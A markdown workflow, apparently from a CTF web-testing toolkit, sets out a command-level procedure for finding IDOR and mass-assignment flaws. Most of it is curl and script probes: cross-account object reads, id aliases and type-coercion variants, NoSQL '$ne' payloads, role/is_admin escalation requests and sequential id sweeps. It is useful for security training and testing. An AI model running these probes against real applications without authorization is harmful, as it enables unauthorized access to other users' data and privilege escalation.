# Workflow — the bounded end-to-end loop

The repeatable sequence. `detection.md` maps the surface; this is the
command-level run.

---

## 0. Setup — two identities

```
register A → save a.cookies
register B → save b.cookies
A creates a private object → record its id (the response / the URL)
```

Both accounts are yours — the probe is safe on a shared instance.

## 1. The identifier map

As A, map every identifier the app shows you:

- the URL's path/query ids
- the body's `id`/`user_id`/`owner` fields
- the response's `id`/`owner_id`/`created_by`
- the `Set-Cookie` ids
- the JWT `sub`/`uid` claim
- the GraphQL `id`/`gid` arguments
- the `?file=`/`?doc=`/`?download=` params
- the `X-*` headers

Record each with: location, format, what it addresses, who owns it.

## 2. The two-identity probe — the decisive one

```bash
# A's object id (e.g. 1001)
python3 tools/web/http_probe.py --challenge "$C" --class web-idor \
  --url "$BASE/api/notes/1001" --header "Cookie: session=$B" \
  --evidence-regex '"owner_id"\s*:\s*1|"email"\s*:\s*"a@|"text"\s*:\s*"A-' \
  --evidence-kind impact --on-match confirms --on-miss refutes
```

`confirms` → IDOR proven. `refutes` → the check held; the negative is
recorded — try the next carrier/variant, not the same one.

## 3. The variants on the same id

```bash
# format
curl -b b.cookies "$BASE/api/notes/1001.json"
curl -b b.cookies "$BASE/api/notes/1001.xml"
# method
curl -b b.cookies -X PUT "$BASE/api/notes/1001" -d '{}'
curl -b b.cookies -X PATCH "$BASE/api/notes/1001" -d '{}'
# alias
curl -b b.cookies "$BASE/api/notes/me"      # 'me' alias
curl -b b.cookies "$BASE/api/notes/1"       # id=1 admin
curl -b b.cookies "$BASE/api/notes/0"       # id=0
curl -b b.cookies "$BASE/api/notes/-1"
# carrier
curl -b b.cookies "$BASE/api/notes?id=1001"
curl -b b.cookies -X POST "$BASE/api/notes" -d '{"id":1001}'
curl -b b.cookies "$BASE/api/notes/1001" -H 'X-User-Id: 1'
# collection
curl -b b.cookies "$BASE/api/notes?user_id=1"
curl -b b.cookies "$BASE/api/notes?owner=1"
curl -b b.cookies "$BASE/api/notes?ids=1,2,3"
# bulk
curl -b b.cookies -X POST "$BASE/api/batch" -d '[{"url":"/notes/1001"}]'
# nested
curl -b b.cookies "$BASE/api/users/1/notes/1001"
```

Each variant is a separate falsifiable probe.

## 4. The mass-assign check

```bash
# does the update bind the owner/role field?
curl -b b.cookies -X PATCH "$BASE/api/me" -d '{"role":"admin"}'
curl -b b.cookies -X PATCH "$BASE/api/me" -d '{"user_id":1}'
curl -b b.cookies -X PATCH "$BASE/api/users/me" -d '{"is_admin":true}'
# re-read — did it bind?
python3 tools/web/http_probe.py --challenge "$C" --class web-idor \
  --url "$BASE/api/me" --header "Cookie: session=$B" \
  --evidence-regex '"role"\s*:\s*"admin"|"is_admin"\s*:\s*true' \
  --evidence-kind impact --on-match confirms --on-miss refutes
```

## 5. The predictable-id check

```bash
# is the id sequential? sweep
python3 tools/web/id_sweep.py --url "$BASE/api/users/{id}" \
  --header "Cookie: session=$B" --range 1-100 \
  --hit-regex '"role"\s*:\s*"admin"|"email"' --miss-regex '404|"error"|"not found"'
# is it a uuid v1? predict from created_at
# is it b64 Type:id? decode-change-encode
# is it a hash of a known? recompute
```

## 6. The "the check is loose" variant

```bash
# type-coercion
curl -b b.cookies "$BASE/api/notes/1001.0"
curl -b b.cookies "$BASE/api/notes/'1001'"
curl -b b.cookies "$BASE/api/notes/+1001"
curl -b b.cookies "$BASE/api/notes/01001"
curl -b b.cookies "$BASE/api/notes/0x3e9"
curl -b b.cookies "$BASE/api/notes/1e3"
# array/object
curl -b b.cookies "$BASE/api/notes?id[]=1001"
curl -b b.cookies -X POST "$BASE/api/notes" -d '{"id":[1001]}'
curl -b b.cookies -X POST "$BASE/api/notes" -d '{"id":{"$eq":1001}}'
curl -b b.cookies -X POST "$BASE/api/notes" -d '{"id":{"$ne":0}}'
```

## 7. The "the other carrier" variant

```bash
# the same id via a different carrier
curl -b b.cookies -X POST "$BASE/api/notes" -d '{"id":1001}' \
  -H 'Content-Type: application/json'
curl -b b.cookies -X POST "$BASE/api/notes" -d 'id=1001' \
  -H 'Content-Type: application/x-www-form-urlencoded'
curl -b b.cookies -X POST "$BASE/api/notes" \
  -H 'Content-Type: text/xml' -d '<note><id>1001</id></note>'
```

## 8. The second-identity budget

Two accounts is the minimum. The fuller identity set, in cost order:

| Identity | What it proves | When needed |
|---|---|---|
| B (second user, same role) | object-level authz | every probe — the baseline |
| C (admin/privileged user, if obtainable) | role-level vs object-level split | when "admin" objects are the target |
| anonymous (no session) | public-vs-private split | before claiming "foreign read" — rules out public objects |
| second-tenant account | tenant boundary | multi-tenant apps only |

Registration cost is usually trivial (no email verification in CTF).
The expensive case is role-gated identity C — try the mass-assign
`role`/`is_admin` field on B first; it is cheaper than earning a real
admin.

## 9. The control-fetch discipline

Every confirming probe gets its pair: B fetches `id=A's` AND B fetches
`id=B's` in the same session, recorded together. The pair is the proof
that the marker came from A's object, not a default-to-self handler.
Also fetch an id that does not exist — the 404/500 split tells you
whether the handler distinguishes "missing" from "foreign", which
decides whether a 404 on the foreign id is denial or evidence.

## 10. The ledger write

Per attempt, one line in the hypothesis ledger:

```bash
python3 tools/state.py $C --hypothesis "path-id-foreign" --bug-class web-idor
python3 tools/state.py $C --hypothesis-id <id> --probe "GET /items/1042 as B" \
  --result "404 == nonexistent control; scoped query" --status rejected
```

The `--result` records WHERE the wall was (scoped query vs middleware vs
resolver) so the next rung skips the dead layer rather than re-walking
it.

## 11. The stop

After the ordered probes, the falsifier either fired (record `refutes`,
move to the next carrier) or a `confirms` landed (record `--response`
verbatim, done). Don't re-walk a dead branch — `decide.py` names the
next rung.
